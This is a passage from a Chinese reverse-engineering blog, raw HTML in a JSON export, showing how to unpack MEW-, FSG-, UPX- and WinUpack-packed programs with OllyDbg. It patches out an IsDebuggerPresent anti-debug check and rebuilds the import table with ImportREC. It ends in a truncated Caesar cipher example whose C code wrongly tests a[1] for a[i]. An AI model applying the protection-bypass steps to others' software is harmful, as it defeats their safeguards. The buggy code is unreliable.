title=\"2.MEW压缩壳\"></a>2.MEW压缩壳</h4>\n      <p>程序：<img src=\"/2023/04/22/ketu/p41.png\" alt=\"image-20220416111513837\"></p>\n<p>查看壳：<img src=\"/2023/04/22/ketu/p42.png\" alt=\"image-20220416111616682\"></p>\n<p>这题只需要注意一点，像MEW系列壳除了可以使用堆栈平衡原理寻找OEP，记得分析代码；还可以在第一个区段网下滑找到retn加断点，F9运行到这F8,就到了OEP。应为这种壳，就是有个大区段，对软件进行解压缩，没有对它进行什么防护措施！</p>\n<p>其他的都很简单，直接ReBulid PE就行，不用删除什么区块！</p>\n\n        <h2 id=\"5-text区块加断点寻找OEP\">\n          <a href=\"#5-text区块加断点寻找OEP\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#5-text区块加断点寻找OEP\" class=\"headerlink\" title=\"5 . .text区块加断点寻找OEP\"></a>5 . .text区块加断点寻找OEP</h2>\n      <p>程序：<img src=\"/2023/04/22/ketu/p43.png\" alt=\"image-20220417165724224\"></p>\n<p>查看壳：<img src=\"/2023/04/22/ketu/p44.png\" alt=\"image-20220417165927233\"></p>\n<p>该程序直接点击运行是没有任何问题的，但是一用OD运行就只能运行出一个空窗口，而且这时使用堆栈平衡法寻找OEP也是不管用，所以这个程序是具有反调试系统的，所以我们之能先一步一步走，看能不能找到关于OD的API函数，直到运行到：</p>\n<p><img src=\"/2023/04/22/ketu/p45.png\" alt=\"image-20220417171333489\"></p>\n<p><img src=\"/2023/04/22/ketu/p46.png\" alt=\"image-20220417171627417\"></p>\n<p>IsDebuggerPresent是windows提供的对调试器判断的一个API</p>\n<p>还有一种更快捷的办法，右键&#x2F;查找&#x2F;所有模块中的名称&#x2F;往下滑就能看到IsDebuggerPresent：<img src=\"/2023/04/22/ketu/p47.png\" alt=\"image-20220417174617927\"></p>\n<p>双击就进了它的动态链接库：<img src=\"/2023/04/22/ketu/p48.png\" alt=\"image-20220417175339918\"></p>\n<p>在这里我们加断点，运行到这，然后按Alt+F9也可以来到差不多我们刚才单步走到的位置！<img src=\"/2023/04/22/ketu/p49.png\" alt=\"image-20220417180734491\"></p>\n<p>注意寄存器EAX，当能探测到调试器的时候eax&#x3D;1，反之不能探测到则为eax&#x3D;0</p>\n<p>因此可见，该程序跳转就不能是实现了：<img src=\"/2023/04/22/ketu/p50.png\" alt=\"image-20220417181116429\"></p>\n<p><img src=\"/2023/04/22/ketu/p51.png\" alt=\"image-20220417181138685\"></p>\n<p>所以我们可以先修改，标准寄存器ZF位的值吧，也可以把它改为jmp，让其实现跳转，此时再按F9运行可见程序就能正常执行了！</p>\n<p>此时就是去掉他的反调试功能了，在修改jmp的位置此时右键&#x2F;复制到可执行文件&#x2F;选择，然后保存文件，命名2。</p>\n<p>继续用OD打开去掉反调试后的该文件2：<img src=\"/2023/04/22/ketu/p52.png\" alt=\"image-20220417220910299\"></p>\n<p>查看进程内存：<img src=\"/2023/04/22/ketu/p53.png\" alt=\"image-20220417221014633\"></p>\n<p>但是！后面发现，用堆栈平衡方式寻找OEP并没有用，甚至停不下！所以这里我们要用另外一种方法就是在.text区块加断点！因为壳不论怎么运行终究还是要回到源程序的代码段的，所以我们就直接在原程序代码段加断点：<img src=\"/2023/04/22/ketu/p54.png\" alt=\"image-20220417221621685\"></p>\n<p>00401000右键&#x2F;在访问上设置中断，运行：<img src=\"/2023/04/22/ketu/p55.png\" alt=\"image-20220417221947771\"><img src=\"/2023/04/22/ketu/p56.png\" alt=\"image-20220417222117355\"></p>\n<p>但是这并不是我们想要的地址，那由于运行过了，断点取消了，那我们再继续断继续走，多次后发现并不可以，但是我们看到了loopd:<img src=\"/2023/04/22/ketu/p57.png\" alt=\"image-20220417222350059\"></p>\n<p>可以看到这里灰线的箭头其实是多次循环回去了，所以我们先直接先让它跳出循环再说，在循环外的下一个地址加断&#x2F;运行&#x2F;取段，就来到了这：<img src=\"/2023/04/22/ketu/p58.png\" alt=\"image-20220417222642877\"></p>\n<p>此时再次00401000下断点&#x2F;运行的时候，又是多次来到了这里：<img src=\"/2023/04/22/ketu/p59.png\" alt=\"image-20220417222921036\"></p>\n<p>可见这是又有一个循环的，那总是进去很多个循环怎么办，一个一个像上面那样吗？不！我们重新开始，可以Ctrl+F8，或者长按F8，先观察循环都在哪里，再直接找到循环的末端，通过上面的方式下断：<img src=\"/2023/04/22/ketu/p60.png\" alt=\"image-20220417225402388\"></p>\n<p>看就是这个灰色循环，目前我们已经断在外了，取断后，断00401000执行，然后我们就来到真实的OEP啦，右键&#x2F;分析&#x2F;分析代码：<img src=\"/2023/04/22/ketu/p61.png\" alt=\"image-20220417225655198\"></p>\n<p>然后我们就把它dump5吧：<img src=\"/2023/04/22/ketu/p62.png\" alt=\"image-20220417225834904\"></p>\n<p>接下来备份dump5就可以开始老的方法wipe去除多余的区块.Prt啦！<br>图片 p120.png:</p>\n<p><img src=\"/2023/04/22/ketu/%E5%9B%BE%E7%89%87p120.png\" alt=\"image-20220417230154503\"></p>\n<p>成功啦！</p>\n<hr>\n\n        <h1 id=\"三·-重建IAT输入表-Import-Address-Table\">\n          <a href=\"#三·-重建IAT输入表-Import-Address-Table\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#三·-重建IAT输入表-Import-Address-Table\" class=\"headerlink\" title=\"三· 重建IAT输入表(Import Address Table)\"></a>三· 重建IAT输入表(Import Address Table)</h1>\n      \n        <h2 id=\"1-啥是输入表？\">\n          <a href=\"#1-啥是输入表？\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-啥是输入表？\" class=\"headerlink\" title=\"1 . 啥是输入表？\"></a>1 . 啥是输入表？</h2>\n      <p>在各种不同版本的Windows系统中，DLL的版本各不相同，同一函数在不同版本DLL中的位置也可能不同；另外一个原因在于DLL的重定位，DLL文件的ImageBase值一般为10000000，但当两个DLL尝试装载到同一个地址时会发生冲突，因此有一个DLL得寻找另一个地址装载，这就是所谓的DLL重定位。</p>\n<p>因此当我们要调用某个DLL中的函数时，需要借助IAT(Import Address Table，导入地址表）作为中间桥梁。PE文件在装载时由PE装载器将导入函数的真实地址写入到IAT时，函数调用时则需要从IAT中获取函数的真实地址。</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">对于每一个引入的可执行文件（例如dll），有一个镜像引入描述符(IMAGE_IMPORT_DESCRIPTOR)。</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class=\"line\">     <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">          DWORD Characteristics;         <span class=\"comment\">// 0 for terminating null import descriptor</span></span><br><span class=\"line\">          DWORD OriginalFirstThunk;   <span class=\"comment\">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class=\"line\">     &#125;;</span><br><span class=\"line\">     DWORD TimeDateStamp;           <span class=\"comment\">// 0 if not bound,</span></span><br><span class=\"line\">                                                                <span class=\"comment\">// -1 if bound, and real date\\time stamp</span></span><br><span class=\"line\">                                                                <span class=\"comment\">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class=\"line\">                                                                <span class=\"comment\">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class=\"line\">      DWORD ForwarderChain;           <span class=\"comment\">// -1 if no forwarders</span></span><br><span class=\"line\">      DWORD Name;                             <span class=\"comment\">// RVA，指向字符串，是这个可执行文件的名字。例如&quot;ACE.dll&quot;</span></span><br><span class=\"line\">      DWORD FirstThunk;                     <span class=\"comment\">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class=\"line\">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></div></figure>\n\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">IAT是一个IMAGE_THUNK_DATA类型的数组。有多少个函数被导入，这个数组就有多少个成员。该数组以<span class=\"number\">0</span>结尾。</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class=\"line\">     <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">           DWORD ForwarderString;          <span class=\"comment\">// 一个RVA地址，指向forwarder string </span></span><br><span class=\"line\">           DWORD Function;                       <span class=\"comment\">// PDWORD，被导入的函数的入口地址</span></span><br><span class=\"line\">           DWORD Ordinal;                         <span class=\"comment\">// 该函数的序数</span></span><br><span class=\"line\">           DWORD AddressOfData;           <span class=\"comment\">// 一个RVA地址，指向IMAGE_IMPORT_BY_NAME</span></span><br><span class=\"line\">      &#125; u1;</span><br><span class=\"line\">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></div></figure>\n\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">PIMAGE_IMPORT_BY_NAME是一个非常简单的结构，就两个成员。</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class=\"line\">     WORD Hint;            <span class=\"comment\">// 该函数的导出序数</span></span><br><span class=\"line\">     BYTE Name[<span class=\"number\">1</span>];      <span class=\"comment\">// 该函数的名字</span></span><br><span class=\"line\">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></div></figure>\n\n<p><img src=\"/2023/04/22/ketu/p63.png\" alt=\"image-20220418162411370\"></p>\n\n        <h2 id=\"2-OD跟踪输入表\">\n          <a href=\"#2-OD跟踪输入表\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-OD跟踪输入表\" class=\"headerlink\" title=\"2 . OD跟踪输入表\"></a>2 . OD跟踪输入表</h2>\n      <p>例程序：<img src=\"/2023/04/22/ketu/p64.png\" alt=\"image-20220418163214018\"></p>\n<p>这是个简单的MessgeBoxA对话框程序，用OD打开：<img src=\"/2023/04/22/ketu/p65.png\" alt=\"image-20220418163346289\"></p>\n<p>虽然OD注释可以识别到这是MessgeBox，但点开这条指令是call 004011EA，那为什么它知道内存地址0x004011EA地址是一个MessgeBoxA的API函数呢？</p>\n<p>那我们就在这行按下回车Enter键：<img src=\"/2023/04/22/ketu/p66.png\" alt=\"image-20220418164053565\"></p>\n<p>可以看到这是个跳转，其实周围还很多都是跳转，查看下面按是跳转到哪里：<img src=\"/2023/04/22/ketu/p67.png\" alt=\"image-20220418164207582\"></p>\n<p>上面显示的是取[00402048]内存地址里面的值&#x3D;77D507EA跳转，为了验证一下，我们在内存窗口Ctrl+G输入00402048，就来到了这个地址：<img src=\"/2023/04/22/ketu/p68.png\" alt=\"image-20220418164606243\"></p>\n<p>根据小端存储，从右往左读，发现正是77D507EA!</p>\n<p>所以我们可以知道在这整个程序无论到在个位置调用MessgeBoxA，它都相当于call 004011EA，在这里集中跳转到MessgeBoxA的动态链接库！<img src=\"/2023/04/22/ketu/p69.png\" alt=\"image-20220418170825475\"></p>\n<p>可以看到上面这些都是OD分析给我的，但是OD为什么会知道呢，其实就是根据IAT得出的！</p>\n<p>接下来我们继续跟踪输入表，Alt+M到内存双击PE文件头，也就是00400000区块：</p>\n<p>然后我们就可以看到标准PE头文件格式：<img src=\"/2023/04/22/ketu/p70.png\" alt=\"image-20220418173633788\">标志：<img src=\"/2023/04/22/ketu/p71.png\" alt=\"image-20220418173706834\">Image Base：<img src=\"/2023/04/22/ketu/p72.png\" alt=\"image-20220418173758790\">偏移地址，这是输入表的地址Import Table address：<img src=\"/2023/04/22/ketu/p73.png\" alt=\"image-20220418173909910\"></p>\n<p>回到内存窗口，其实输入表所在地差不多就在这个位置：<img src=\"/2023/04/22/ketu/p74.png\" alt=\"image-20220418174153805\"></p>\n<p>接下来我们在代码窗口Ctrl+G搜索00402050，我们就来到了这里，但是发现没办法分析，因为它认为我们这不是在代码段：<img src=\"/2023/04/22/ketu/p75.png\" alt=\"image-20220418174515314\"></p>\n<p>所以我们要像之前一样安装一个新的插件：<img src=\"/2023/04/22/ketu/p76.png\" alt=\"image-20220418174706485\"></p>\n<p>安装好插件后重新打开，就可以点击Analyze This!<img src=\"/2023/04/22/ketu/p77.png\" alt=\"image-20220418175424943\"></p>\n<p>可见左边黑色数据是小端存储，右边绿色是OD简化成了我们方便阅读的字节形式，都是相对400000的偏移地址，可见总共有两个IMAGE_IMPORT_DESCRIPTOR，最后一个全是0是作为结束的标识。我们先尝试Ctrl+G搜第一个参数OriginalFilrstThunk地址00402098：<img src=\"/2023/04/22/ketu/p78.png\" alt=\"image-20220418180222534\"></p>\n<p>然后就走到了INT的第一个参数IMACE_THUNK_DATA又是一个偏移地址00402122，继续搜：<img src=\"/2023/04/22/ketu/p79.png\" alt=\"image-20220418180509903\"></p>\n<p>可见我们就来到了IMAGE_IMPORT_BY_NAME内，可找到函数的名字（都是由ASCII码转换翻译的）！</p>\n<p>然后看到IMAGE_IMPORT_DESCRIPTOR第五个参数FirstThunk，这才是真正指向IAT的偏移地址：<img src=\"/2023/04/22/ketu/p80.png\" alt=\"image-20220418181002394\"></p>\n<p>搜索到：<img src=\"/2023/04/22/ketu/p81.png\" alt=\"image-20220418181113132\"></p>\n<p>可见其实这就是IAT输入表！</p>\n\n        <h2 id=\"3-HOOK-API\">\n          <a href=\"#3-HOOK-API\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3-HOOK-API\" class=\"headerlink\" title=\"3 . HOOK-API\"></a>3 . HOOK-API</h2>\n      <p>壳为了防止输入表被还原，强化壳自身的保护功能，会在IAT大量加密。</p>\n<p>例如：源程序要调用一个函数的时候需要找IAT，然后却进到了壳程序进行监控般的跳转才能最终回到IAT!</p>\n<hr>\n\n        <h1 id=\"四·-FSG压缩壳和ImportREC的使用\">\n          <a href=\"#四·-FSG压缩壳和ImportREC的使用\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#四·-FSG压缩壳和ImportREC的使用\" class=\"headerlink\" title=\"四· FSG压缩壳和ImportREC的使用\"></a>四· FSG压缩壳和ImportREC的使用</h1>\n      <p>程序可以正常运行：<img src=\"/2023/04/22/ketu/p82.png\" alt=\"image-20220418184914873\"></p>\n<p>查看壳：<img src=\"/2023/04/22/ketu/p83.png\" alt=\"image-20220418184815948\"></p>\n<p>可见这是用Delphi7.0写的程序，API比较多，所以IAT修复比较麻烦！</p>\n<p>安装壳程序，点击install.exe,或者自行解压fsg.rar：<img src=\"/2023/04/22/ketu/p84.png\" alt=\"image-20220418185939919\"></p>\n<p>给程序FishC加壳，拖拽即可！这是一个压缩壳，压缩44%<img src=\"/2023/04/22/ketu/p85.png\" alt=\"image-20220418202739825\">加壳后程序也可正常运行！</p>\n<p>现在查看壳就可看到壳了：<img src=\"/2023/04/22/ketu/p86.png\" alt=\"image-20220418203113866\"></p>\n<p>把加FSG壳后的程序用OD打开:<img src=\"/2023/04/22/ketu/p87.png\" alt=\"image-20220418203704260\"></p>\n<p>此时用老方法较为复杂，目前使用一种新方法，步骤如上图1234，选项&#x2F;调试选项&#x2F;SFX&#x2F;字节方式跟踪真正入口处&#x2F;重新运行！</p>\n<p>在这之后，还是回到了原来的地方，然后再带点击选项&#x2F;调试选项&#x2F;SFX&#x2F;停在自解压器的入口&#x2F;重新运行&#x2F;，就可以看见左下角在疯狂的运行，这是在模拟程序的运行，自解压：<img src=\"/2023/04/22/ketu/p88.png\" alt=\"image-20220418204434819\"></p>\n<p>然后就来到了OEP，接下来就是右键&#x2F;分析&#x2F;从模块中删除分析：<img src=\"/2023/04/22/ketu/p89.png\" alt=\"image-20220418204709439\"></p>\n<p>接下来就可以dump操作了。由于SFG壳破坏了IAT，所以不要勾选重建输入表，因为勾选了也没用！我们接下来还要借助ImpREC.exe神奇工具修复IAT!</p>\n<p><img src=\"/2023/04/22/ketu/p90.png\" alt=\"image-20220418214958019\"></p>\n<p>如图，要确保要修改的程序被OD打开中或者与运行中，ImpREC才能检测到，然后根据我们刚才跟踪到了SFX代码真正入口点的地址，提取偏移地址，修改上面红色框起来的OEP，然后点击IAT AutoSearch就弹出一个提示框：<img src=\"/2023/04/22/ketu/p91.png\" alt=\"image-20220418215506236\"></p>\n<p>ImportREC会自动搜索所有的IAT!</p>\n<p>翻译：好像找到了一些东西，但也有可能不不正确，如果不正确，建议把RAV改成：00001000 Size改成：00094000</p>\n<p>接下俩我们就来验证一下，在内存搜索RAV地址，看它是不是IAT的入口点：<img src=\"/2023/04/22/ketu/p92.png\" alt=\"image-20220418220105690\"></p>\n<p>就看到这里：<img src=\"/2023/04/22/ketu/p93.png\" alt=\"image-20220418220743104\"></p>\n<p>继续往下滑就可以看见熟悉的API函数：<img src=\"/2023/04/22/ketu/p94.png\" alt=\"image-20220418220842333\"></p>\n<p>可见00461BEC上面还包含一些数据其实也是，所以我们还要是要把RVA改成：0046B12C，把这些数据包含进去，这才能确保我们的IAT修复的是完整的，才能正常打开程序！</p>\n<p>可见IAT最后到了这里：<img src=\"/2023/04/22/ketu/p95.png\" alt=\"image-20220418221448148\"></p>\n<p>所以Size也要修改，范围大了可以，范围小了就不可以，只要把全部IAT包含到了就可以！我们修改成大概10000吧：<img src=\"/2023/04/22/ketu/p96.png\" alt=\"image-20220418221928933\"></p>\n<p>然后我们就可以点击Get Imports按钮了！</p>\n<p>加载一会儿，可以看到很多的valid:NO这些就都是不合法的，总共有6642条都是不合法：<img src=\"/2023/04/22/ketu/p97.png\" alt=\"image-20220418222316652\"></p>\n<p>所以我们点击Show Invalid按钮把不合法的都展示出来，可见这些不合法的数据穿插在各个IAT里面，只要程序加载到这里的时候，加载不到，就会报错！所以我们右键&#x2F;Cut thunk(s)，把这些不合法的东西全部都给砍掉！<img src=\"/2023/04/22/ketu/p98.png\" alt=\"image-20220418222733408\"></p>\n<p>然后就可见我们见到的都是valid:YES的了，然后我们就点击Fix Dump按钮，选择覆盖刚才OD的dump文件：<img src=\"/2023/04/22/ketu/p99.png\" alt=\"image-20220418222951970\"></p>\n<p>然后它就帮我们多生成了一个文件dump_可以正常运行！</p>\n<p>然后再用PEiD查看壳，如果有时候查看不出来<img src=\"/2023/04/22/ketu/p100.png\" alt=\"image-20220418223541715\">可以选择选项&#x2F;深度扫描：<img src=\"/2023/04/22/ketu/p101.png\" alt=\"image-20220418223618570\"></p>\n<p>就出来了！也可以观察到，脱壳后的文件变大了！</p>\n<hr>\n\n        <h1 id=\"五-UPX和WinUpacx压缩壳\">\n          <a href=\"#五-UPX和WinUpacx压缩壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#五-UPX和WinUpacx压缩壳\" class=\"headerlink\" title=\"五 . UPX和WinUpacx压缩壳\"></a>五 . UPX和WinUpacx压缩壳</h1>\n      <p><span class=\"exturl\"><a class=\"exturl__link\" href=\"http://upx.sourceforge.net/\">UPX官网</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n<p>UPX壳是目前最流行的，最稳定的壳，更新也较块！</p>\n\n        <h2 id=\"1-upx309w命令行加-脱壳\">\n          <a href=\"#1-upx309w命令行加-脱壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-upx309w命令行加-脱壳\" class=\"headerlink\" title=\"1 . upx309w命令行加\\脱壳\"></a>1 . upx309w命令行加\\脱壳</h2>\n      <p><img src=\"/2023/04/22/ketu/p102.png\" alt=\"image-20220419090226751\"></p>\n<p>win+R打开控制台，cd到壳程序目录下，upx.exe加壳，后面的才参数是我们待加壳地程序，加壳后可以看到，压缩到了原来的51.93%，大小从582656变成了302592字节！</p>\n<p>其实也可以不用命令行，直接拖拽到upx.exe加壳！</p>\n<p>然后我们就能查到壳：<img src=\"/2023/04/22/ketu/p103.png\" alt=\"image-20220419090621346\"></p>\n<p>然后查阅文档可知，命令加上-d参数，即可脱壳：<img src=\"/2023/04/22/ketu/p104.png\" alt=\"image-20220419091006607\"></p>\n<p>如下：<img src=\"/2023/04/22/ketu/p105.png\" alt=\"image-20220419091127168\"></p>\n\n        <h2 id=\"2-Free-UPX\">\n          <a href=\"#2-Free-UPX\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-Free-UPX\" class=\"headerlink\" title=\"2 . Free UPX\"></a>2 . Free UPX</h2>\n      <p><img src=\"/2023/04/22/ketu/p106.png\" alt=\"image-20220419104644009\"></p>\n<p>点击Add files按钮选择程序，COMPRESS是加壳，DECOMPRESS脱壳，下面的Backup file可以选择create可以创建一个副本，备份原程序！</p>\n\n        <h2 id=\"3-OD脱UPX壳\">\n          <a href=\"#3-OD脱UPX壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3-OD脱UPX壳\" class=\"headerlink\" title=\"3 . OD脱UPX壳\"></a>3 . OD脱UPX壳</h2>\n      <p>OD打开加UPX壳后的fishc程序:<img src=\"/2023/04/22/ketu/p107.png\" alt=\"image-20220419111142757\"></p>\n<p>通过堆栈平衡原理寻找OEP过程中，硬件断点来到这里:<img src=\"/2023/04/22/ketu/p108.png\" alt=\"image-20220419111400944\"></p>\n<p>由于这是3.09的版本壳，在之前的版本有可能是jmp，但这里jmp在下面，所以我们先取消硬件断点，然后在下面的jmp加断点&#x2F;运行至此&#x2F;去掉断点&#x2F;F8&#x2F;分析&#x2F;分析代码，就来到了OEP:<img src=\"/2023/04/22/ketu/p109.png\" alt=\"image-20220419111758641\"><img src=\"/2023/04/22/ketu/p110.png\" alt=\"image-20220419111850970\"></p>\n<p>然后dump操作，注意不要勾选重建输入表，接下来我们要用ImportRE恢复！</p>\n\n        <h2 id=\"5-使用ImportREC修复IAT\">\n          <a href=\"#5-使用ImportREC修复IAT\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#5-使用ImportREC修复IAT\" class=\"headerlink\" title=\"5 . 使用ImportREC修复IAT\"></a>5 . 使用ImportREC修复IAT</h2>\n      <p><img src=\"/2023/04/22/ketu/p111.png\" alt=\"image-20220419114356233\"></p>\n<ol>\n<li>先点击小三角选择用OD正在运行的原程序文件</li>\n<li>更具OD找到的OEP，修改ImportREC的OEP里面的偏移地址</li>\n<li>点击IAT AutoSearch按钮确定</li>\n<li>根据给出的RAV偏移地址去OD内存搜索验证，保证输入表没被修改，如果被修改了，就要把RAV的偏移地址调整过来，把IAT包含进去！这里可见上滑上面没有了，是可以的准确的，下面的Size也把IAT包含了，OK<img src=\"/2023/04/22/ketu/p112.png\" alt=\"image-20220419115822595\"></li>\n<li>点击Get Imports按钮，点击Show Invalid按钮，可见没有错误的IAT<img src=\"/2023/04/22/ketu/p113.png\" alt=\"image-20220419120253262\"></li>\n<li>就可以直接Fix Dump选择刚才OD的dumpupx文件了！</li>\n</ol>\n\n        <h2 id=\"6-WinUpacx壳\">\n          <a href=\"#6-WinUpacx壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#6-WinUpacx壳\" class=\"headerlink\" title=\"6 . WinUpacx壳\"></a>6 . WinUpacx壳</h2>\n      <p>该壳压缩效率更高，但已不更新！</p>\n<p><img src=\"/2023/04/22/ketu/p114.png\" alt=\"image-20220419123029712\"></p>\n<p>界面中文，比较友好！建议勾选3.清除导出表&#x2F;4.清除重定位表</p>\n<p>然后压缩之后会出现一个文件：<img src=\"/2023/04/22/ketu/p115.png\" alt=\"image-20220419123200002\">这个文件去掉.bak后缀之后就是我们的原程序备份！</p>\n<p>然后OD打开：<img src=\"/2023/04/22/ketu/p116.png\" alt=\"image-20220419124124354\"></p>\n<p>入过一开始不是这里，那也可以Alt+M，双击fishc在数据窗口找到偏移地址，即可搜索：<img src=\"/2023/04/22/ketu/p117.png\" alt=\"image-20220419124349123\"></p>\n<p>接下来就是根据堆栈平衡寻找OEP:<img src=\"/2023/04/22/ketu/p118.png\" alt=\"image-20220419124602886\"></p>\n<p>就可进行dump操作，由于输入表已被破坏所以记得不用勾选重建，重建也是错误的!</p>\n<p>然后其实和上一个程序一样操作ImportREC，不多赘述！</p>\n<p>然后如果还不满意可以再进行LordPE操作：<img src=\"/2023/04/22/ketu/p119.png\" alt=\"image-20220419125328317\"></p>\n<p>最后这就就完美啦！恭喜结业！！！芜湖！！！</p>\n<p>链接<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://space.bilibili.com/2098810443\">欢迎大家关注我的Bilibli</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span><br>感谢一键三连哦~</p>\n<hr>\n","categories":["程序壳","程序脱壳篇"],"tags":["程序壳","程序脱壳篇"]},{"title":"恺撒密码","url":"/2023/04/22/kaisa/","content":"<p>点击文章标题进入阅读模式！</p>\n<p>尊重知识产权，引用注明出处！谢谢合作！<br>有问题请在B站私信！<br>链接<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://space.bilibili.com/2098810443\">欢迎大家关注我的Bilibli</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span><br>感谢一键三连哦~</p>\n<p>  在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p>\n<p>这里我们主要讨论的还是如何使用C语言，和Python语言实现恺撒密码的算法！<br>关于密码，具体还请看到百度百科解释<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://baike.baidu.com/item/%E6%81%BA%E6%92%92%E5%AF%86%E7%A0%81/4905284\">恺撒密码</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span><br><img src=\"/2023/04/22/kaisa/kaisa.jpg\" alt=\"图片\"></p>\n<p>（1）. 如何确定哪些字符不需要改变？哪些字符需要改变？如果需要改变？应该改为哪个对应的字符？</p>\n<p>算法的处理方法是：输入一个字符串，给字符变量char c，先判定它是否为字母（包括大小写）。若不是字母，则不改变c的值；若是字母则还要继续检查它是否在（‘Z’-密钥数字+1~’Z’）内（包括大小写字母也是对应转化）。如果不在这个范围，那么就可以正常偏移，即使该字母的ASCII值+密钥，这就等于字母往后移动了密钥的位数；如果在这个范围内，那么偏移是就该使该字母的ASCII值+密钥-26，因为有26个英文字母，所以减26就是回到A开始继续往后移动</p>\n<p>（2）. 如何使字符变量c改变为所指定的字母？</p>\n<p>办法是改变它的ASCII值，例如字符变量的原值使大写字母’A’，想使c的值改变为’E’，只需执行’c &#x3D; c + 4’即可，因为’A’的ASCII值是65，而’E’的ASCII值是69，二者相差4。</p>\n<p>对照ASCII表<br><img src=\"/2023/04/22/kaisa/ASCII.jpg\" alt=\"ASCII表\"></p>\n<p>C语言源程序代码：</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//凯撒密码</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> a[<span class=\"number\">20</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入密文：\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, a);</span><br><span class=\"line\">\tc = <span class=\"built_in\">strlen</span>(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入密钥：\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;b);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; c; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((a[i] &gt;= <span class=\"string\">&#x27;a&#x27;</span> &amp;&amp; a[i] &lt;= <span class=\"string\">&#x27;z&#x27;</span>) || (a[i] &gt;= <span class=\"string\">&#x27;A&#x27;</span> &amp;&amp; a[<span class=\"number\">1</span>] &lt;= <span class=\"string\">&#x27;Z&#x27;</span>))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> ((a[i] &gt;= (<span class=\"string\">&#x27;Z&#x27;</span> - b + <span class=\"number\">1</span>) &amp;&amp; a[i] &lt;= <span class=\"string\">&#x27;Z&#x27;</span>) || (a[i] &gt;= (<span class=\"string\">&#x27;z&#x27;</span> - b + <span class=\"number\">1</span>) &amp;&amp; a[i] &lt;= <span class=\"string\">&#x27;z&#x27;</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\ta[i] = a[i] - (<span class=\"number\">26</span> - b);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\ta[i] = a[i] + b;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span 